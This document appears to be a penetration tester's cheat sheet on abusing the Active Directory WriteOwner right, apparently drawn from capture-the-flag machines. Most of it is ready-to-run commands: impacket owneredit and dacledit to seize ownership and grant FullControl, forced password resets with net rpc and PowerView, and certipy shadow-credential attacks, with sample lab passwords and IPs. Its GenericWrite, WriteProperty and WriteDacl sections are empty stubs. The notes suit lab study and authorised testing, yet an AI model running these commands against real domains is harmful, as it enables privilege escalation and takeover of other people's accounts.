
**WriteOwner**

he WriteOwner permission allows a user to change the ownership of an object to a different user  meaning The owner of an object has the ability to control permissions on that object.

what can we do  the owner can give the object:
- GenericAll
- GenericWrite
- WriteDACL
- Reset Password

```sh
######## LINUX #####
#To change the ownership of the object
#SOMETIMES -new-owner doesnt work use new-owner-sid or so 
owneredit.py -action write -new-owner 'attacker' -target 'victim' -dc-ip DCIP 'DOMAIN'/'USER':'PASSWORD'

#to check the owner of the target
owneredit.py -action read -target ca_svc -dc-ip 10.129.45.247 SEQUEL.HTB/ryan:'WqSZAF6CysDQbGb3'


#To abuse ownership of a user object, you may grant yourself the GenericAll permission FullControl -> full ACL permission set

dacledit.py -action 'write' -rights 'FullControl' -principal-sid 'controlledUser SID' -target-sid 'targetUser SID' -dc-ip DCIP 'domain'/'controlledUser':'password'

#Cleanup of the added ACL can be performed later on with the same tool:

dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'

#Force Change Password

#Use samba's net tool to change the user's password 
net rpc password "michael" "password123" -U "administrator.htb/olivia%ichliebedich" -S "ADMINISTRATOR.HTB" # we can use also IP in domain



######### WINDOWS #######

#powerview
#change ownership of an object 
Set-DomainObjectOwner -Identity "ca_svc"  -OwnerIdentity "ryan"

# add permissions  All 
Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights All  -PrincipalIdentity "ryan" 

#change Password
Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred

#Shadow credentials
certipy shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51


```


**GenericWrite**

```powershell 
#Shadow Credentials
```


**WriteProperty**`

```powershell 
#Shadow Credentials
```

**WriteDacl**


```powershell 
#Shadow Credentials
```
